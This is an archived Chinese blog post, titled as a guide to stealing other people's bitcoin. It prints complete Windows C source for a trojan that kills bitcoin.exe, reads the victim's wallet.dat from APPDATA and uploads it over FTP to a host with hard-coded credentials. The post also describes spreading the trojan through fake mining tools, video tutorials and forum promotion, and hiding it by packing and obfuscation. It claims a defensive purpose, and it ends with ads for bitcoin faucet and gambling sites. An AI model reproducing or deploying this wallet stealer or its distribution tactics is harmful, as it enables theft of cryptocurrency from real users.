@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>如果偷取别人的比特币 | 盖世小虫</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="“如何获取偷取别人的wallet.dat文件”，这个文件包含所有的虚拟币，当然阐述此文的目的不是让你偷取别人的比特币而是让你知道如何保护自己的电子钱包整个流程其实很简单，一小段C语言代码运行查找appdata文件夹下的wallet.dat文件，然后通过FTP上传至别人的电脑，或者通过其他文件传输协议，黑客通过加壳重命名、类似的代码注入、传播、扩散可以很轻松的获取别人的电子钱包">
+<meta property="og:type" content="article">
+<meta property="og:title" content="如果偷取别人的比特币">
+<meta property="og:url" content="http://suetming.cn/2014/06/28/2013-05-22-free-bitcoin/">
+<meta property="og:site_name" content="盖世小虫">
+<meta property="og:description" content="“如何获取偷取别人的wallet.dat文件”，这个文件包含所有的虚拟币，当然阐述此文的目的不是让你偷取别人的比特币而是让你知道如何保护自己的电子钱包整个流程其实很简单，一小段C语言代码运行查找appdata文件夹下的wallet.dat文件，然后通过FTP上传至别人的电脑，或者通过其他文件传输协议，黑客通过加壳重命名、类似的代码注入、传播、扩散可以很轻松的获取别人的电子钱包">
+<meta property="og:image" content="/images/photos/2012-05-24-steal-bitcoin-01.png">
+<meta property="og:image" content="/images/photos/2012-05-24-steal-bitcoin-02.png">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="如果偷取别人的比特币">
+<meta name="twitter:description" content="“如何获取偷取别人的wallet.dat文件”，这个文件包含所有的虚拟币，当然阐述此文的目的不是让你偷取别人的比特币而是让你知道如何保护自己的电子钱包整个流程其实很简单，一小段C语言代码运行查找appdata文件夹下的wallet.dat文件，然后通过FTP上传至别人的电脑，或者通过其他文件传输协议，黑客通过加壳重命名、类似的代码注入、传播、扩散可以很轻松的获取别人的电子钱包">
+  
+    <link rel="alternative" href="/atom.xml" title="盖世小虫" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link href="http://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+</head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">盖世小虫</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><input type="submit" value="&#xF002;" class="search-form-submit"><input type="hidden" name="q" value="site:http://suetming.cn"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-2013-05-22-free-bitcoin" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2014/06/28/2013-05-22-free-bitcoin/" class="article-date">
+  <time datetime="2014-06-28T05:59:17.000Z" itemprop="datePublished">6月 28 2014</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/虚拟货币/">虚拟货币</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      如果偷取别人的比特币
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>“如何获取偷取别人的<strong>wallet.dat</strong>文件”，这个文件包含所有的虚拟币，当然阐述此文的目的不是让你偷取别人的比特币而是让你知道如何保护自己的电子钱包<br>整个流程其实很简单，一小段C语言代码运行查找appdata文件夹下的wallet.dat文件，然后通过FTP上传至别人的电脑，或者通过其他文件传输协议，黑客通过加壳重命名、类似的代码注入、传播、扩散可以很轻松的获取别人的电子钱包</p>
+<p><img src="/images/photos/2012-05-24-steal-bitcoin-01.png" alt="steal bitcoin"></p>
+<p><a id="more"></a></p>
+<h2 id="黑客如何知道我有比特币，如何有效传播木马给比特币的用户？">黑客如何知道我有比特币，如何有效传播木马给比特币的用户？</h2>
+<p>很简单，学习过社会工程学的基本知识就可以搞定，绑定这个木马到任何相关的比特币程序中,比如官网的“比特币挖矿机”,”Bitcoin Stealer Maker”这个木马本身,然后上传一段视频教程到视频网站,然后在论坛推广,多数人会受不了这个诱惑，下载了木马，然后….就没有然后了,因为虽说是木马,但是现在的防毒防木马软件根本无法察觉,因为这种可以说不是木马也不是病毒,可以完全无法察觉,当你觉得你赚取了别人的比特币,实际上已经被别人偷去了比特币</p>
+<h2 id="如何写一个偷取比特币的程序？">如何写一个偷取比特币的程序？</h2>
+<p>下面的程序是一个简单的例子，切记不要用于任何非法盈利比特币的行为中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre>1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+</pre></td><td class="code"><pre><span class="preprocessor">#include <windows.h></span>
+<span class="preprocessor">#include <tlhelp32.h></span>
+<span class="preprocessor">#include <tchar.h></span>
+
+<span class="preprocessor">#include <wininet.h></span>
+<span class="preprocessor">#include <ctime></span>
+<span class="preprocessor">#include <iostream></span>
+<span class="preprocessor">#pragma comment(lib, "wininet")</span>
+
+<span class="keyword">void</span> killprocess()
+{
+	HANDLE hProcessSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, <span class="number">0</span> );
+    <span class="comment">// Get the process list snapshot.</span>
+    PROCESSENTRY32 ProcessEntry = { <span class="number">0</span> };
+    <span class="comment">// Initialize the process entry structure.</span>
+    ProcessEntry.dwSize = <span class="keyword">sizeof</span>( ProcessEntry );
+    <span class="comment">// Get the first process info</span>
+    BOOL Return = FALSE;
+    Return = Process32First( hProcessSnapShot,&ProcessEntry );
+    <span class="keyword">int</span> value = _tcsicmp(ProcessEntry.szExeFile, _T(<span class="string">"bitcoin.exe"</span>));
+    
+    <span class="keyword">if</span> (value==<span class="number">0</span>)
+    {
+        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE
+        	, FALSE
+        	, ProcessEntry.th32ProcessID);
+        <span class="comment">//Open Process to terminate</span>
+        TerminateProcess(hProcess,<span class="number">0</span>);
+        CloseHandle(hProcess); <span class="comment">//Close Handle }</span>
+    }
+    
+    <span class="keyword">while</span>( Process32Next( hProcessSnapShot, &ProcessEntry ));
+    CloseHandle( hProcessSnapShot );
+}
+
+<span class="keyword">int</span> WINAPI WinMain(HINSTANCE hInstance
+, HINSTANCE hPrevInstance
+, LPSTR lpCmdLine
+, <span class="keyword">int</span> nCmdShow)
+{
+    killprocess();
+    Sleep(<span class="number">40000</span>);
+
+    <span class="comment">// 随机种子</span>
+    srand((<span class="keyword">unsigned</span>)time(NULL));
+    <span class="keyword">int</span> seedone=rand();                             
+    <span class="keyword">int</span> seedtwo=rand()*<span class="number">3</span>;                           
+    <span class="keyword">int</span> seedboth = seedone + seedtwo;
+
+    <span class="comment">// 强转int同char</span>
+    <span class="keyword">char</span> randomseed[<span class="number">99</span>];
+	itoa(seedboth,randomseed,<span class="number">10</span>);
+
+    <span class="comment">// 防止wallet.dat因相同文件名而在ftp时被重写</span>
+    <span class="keyword">char</span>* appdata = getenv(<span class="string">"APPDATA"</span>);  <span class="comment">// %Appdata%</span>
+    <span class="keyword">char</span>* truepath = <span class="built_in">strcat</span>(appdata, <span class="string">"\\Bitcoin\\wallet.dat"</span>);
+
+    <span class="comment">//ftp</span>
+    HINTERNET hInternet;
+    HINTERNET hFtpSession;
+    hInternet = InternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,<span class="number">0</span>);
+    hFtpSession = InternetConnect(hInternet
+    	, <span class="string">"ftp.host.com"</span>
+    	, INTERNET_DEFAULT_FTP_PORT
+    	, <span class="string">"user@host.com"</span>
+    	, <span class="string">"bigdickben"</span>
+    	, INTERNET_SERVICE_FTP
+    	, <span class="number">0</span>, <span class="number">0</span>);  <span class="comment">//ftp host, user, pass</span>
+
+    FtpPutFile(hFtpSession
+    	, truepath 
+    	, randomseed 
+    	, FTP_TRANSFER_TYPE_BINARY, <span class="number">0</span>);
+    FtpPutFile(hFtpSession
+    	, truepath
+    	, randomseed
+    	, FTP_TRANSFER_TYPE_BINARY, <span class="number">0</span>);
+
+    InternetCloseHandle(hFtpSession);
+    InternetCloseHandle(hInternet);
+   
+    <span class="keyword">return</span> <span class="number">0</span>;
+}
+</pre></td></tr></table></figure>
+
+<p>当然真正的木马不会像上面的程序这样简单，可能会混淆特征码，加壳，添加复制自身代码，写到其他程序中等等方式隐蔽自己，所以亲，如果你不是程序高手请珍惜比特币，远离XXXX</p>
+<p><img src="/images/photos/2012-05-24-steal-bitcoin-02.png" alt="steal bitcoin"></p>
+<p>记住不要被欲望冲昏了头脑迷住了眼睛</p>
+<h2 id="【广告】免费获得比特币(10+持续更新中)"><strong>【广告】免费获得比特币(10+持续更新中)</strong></h2>
+<p>赠送的额度随着比特币的价值波动变化，目前基本领取的是越来越少</p>
+<h2 id="完成任务获取">完成任务获取</h2>
+<ul>
+<li><a href="http://cur.lv/yj50" target="_blank" rel="external">bitvisit</a> <strong>强力推荐</strong>每隔5分钟点击next会获得不定量的比特币，非常不错，可以开多个窗口哦【建议】</li>
+<li><a href="http://cur.lv/yjdx" target="_blank" rel="external">iwantfreebitcoins</a> 填写各种调查问卷、安装试用软件或者其它小任务免费得到比特币【不建议】</li>
+<li><a href="http://www.bitcoinget.com/" target="_blank" rel="external">bitcoinget</a>问卷调查、视频、其他任务【不建议】</li>
+<li><a href="http://cur.lv/yshe" target="_blank" rel="external">CoinTube</a> 看视频获取</li>
+<li><a href="http://cur.lv/ysid" target="_blank" rel="external">Coin Reaper</a> 随机读取一个免费比特币网站赚取</li>
+</ul>
+<h2 id="发布链接和打广告">发布链接和打广告</h2>
+<ul>
+<li><a href="http://cur.lv/yk3p" target="_blank" rel="external">Anonymous Ads</a> 类似Google AdSense的广告商，不过它的特色在匿名性，不需要注册，只要提供一个收款用的比特币地址即可运作，当然也可以在上面登广告</li>
+<li><a href="https://coinurl.com/" target="_blank" rel="external">CoinURL</a> 提供了一个带广告的短链接，这样你就可以从对外张贴它处理后的短链接来赚比特币了，所以即使你不是网站主或者博主也可以通过论坛签名里的链接改成此短链接等方式来挣比特币，另外也提供类似Google AdSense的广告服务</li>
+</ul>
+<h2 id="一次性提供免费比特币">一次性提供免费比特币</h2>
+<ul>
+<li><a href="http://cur.lv/yk4j" target="_blank" rel="external">Bitcoin Street Faucet</a> 填写手机号，认证后免费获赠比特币</li>
+<li><a href="http://cur.lv/yk5h" target="_blank" rel="external">DragonTale</a> 在线赌场，目前注册后会送一笔可以直接提出的比特币，每天获取一次比特币</li>
+<li><a href="http://cur.lv/yk6t" target="_blank" rel="external">bitcoinaddict</a> 填写收款地址，免费获取比特币</li>
+<li><a href="http://cur.lv/yk61" target="_blank" rel="external">dailybitcoins</a> 填写一个验证码，每天获取(随机)的一定数量的比特币，一天一次</li>
+</ul>
+<h2 id="博彩">博彩</h2>
+<ul>
+<li><a href="http://cur.lv/yskh" target="_blank" rel="external">http://www.freebitcoinlottery.com/</a> 猜6个号码，最高给100000uBTC</li>
+<li><a href="http://cur.lv/ysj5" target="_blank" rel="external">Free BitCoin Daily Scratchcard</a> 获得0.005或更多</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://suetming.cn/2014/06/28/2013-05-22-free-bitcoin/" data-id="gyd4cztmif68wbsg" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/free-bitcoin/">free bitcoin</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2014/06/28/2013-06-08-capture-back-menu-with-history-api/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          利用history api截获返回事件
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2014/06/28/2013-05-14-hashmap-dot-get-cause-an-infinite-loop/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">HashMap.get()所导致的的死循环</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/android/">android</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/deep-learning/">deep learning</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/javascript/">javascript</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/octopress/">octopress</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟货币/">虚拟货币</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/DDOS/">DDOS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Deep-Learning/">Deep Learning</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-performance/">I/O performance</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Scrolling-performance/">Scrolling performance</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/UI-performance/">UI performance</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/custom-elements/">custom elements</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/decorator/">decorator</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/free-bitcoin/">free bitcoin</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/import/">import</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javascript/">javascript</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/seo/">seo</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shadow-DOM/">shadow DOM</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/templates/">templates</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/人脸检测/">人脸检测</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/历史记录/">历史记录</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/悬浮窗/">悬浮窗</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/DDOS/" style="font-size: NaNpx;">DDOS</a><a href="/tags/Deep-Learning/" style="font-size: NaNpx;">Deep Learning</a><a href="/tags/IO-performance/" style="font-size: NaNpx;">I/O performance</a><a href="/tags/Scrolling-performance/" style="font-size: NaNpx;">Scrolling performance</a><a href="/tags/UI-performance/" style="font-size: NaNpx;">UI performance</a><a href="/tags/custom-elements/" style="font-size: NaNpx;">custom elements</a><a href="/tags/decorator/" style="font-size: NaNpx;">decorator</a><a href="/tags/free-bitcoin/" style="font-size: NaNpx;">free bitcoin</a><a href="/tags/import/" style="font-size: NaNpx;">import</a><a href="/tags/javascript/" style="font-size: NaNpx;">javascript</a><a href="/tags/seo/" style="font-size: NaNpx;">seo</a><a href="/tags/shadow-DOM/" style="font-size: NaNpx;">shadow DOM</a><a href="/tags/templates/" style="font-size: NaNpx;">templates</a><a href="/tags/人脸检测/" style="font-size: NaNpx;">人脸检测</a><a href="/tags/历史记录/" style="font-size: NaNpx;">历史记录</a><a href="/tags/悬浮窗/" style="font-size: NaNpx;">悬浮窗</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/07">七月 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/06">六月 2014</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/02">二月 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/08">八月 2013</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2014/07/29/2013-06-29-web-components/">Web组件(Web Components) | HTML5</a>
+          </li>
+        
+          <li>
+            <a href="/2014/06/28/仿360chathead等app悬浮窗效果/">仿360|ChatHead等APP悬浮窗和动画效果</a>
+          </li>
+        
+          <li>
+            <a href="/2014/06/28/2013-07-13-android-performance/">android深度优化</a>
+          </li>
+        
+          <li>
+            <a href="/2014/06/28/2013-06-23-overwrite-global-methods/">重写全局方法 | JavaScript</a>
+          </li>
+        
+          <li>
+            <a href="/2014/06/28/2013-06-08-capture-back-menu-with-history-api/">利用history api截获返回事件</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2014 suetming<br>
+      Powered by <a href="https://github.com/suetming" target="_blank">Suetming</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script type="text/javascript" src="/js/script.js"></script>
+  </div>
+</body>
+</html>
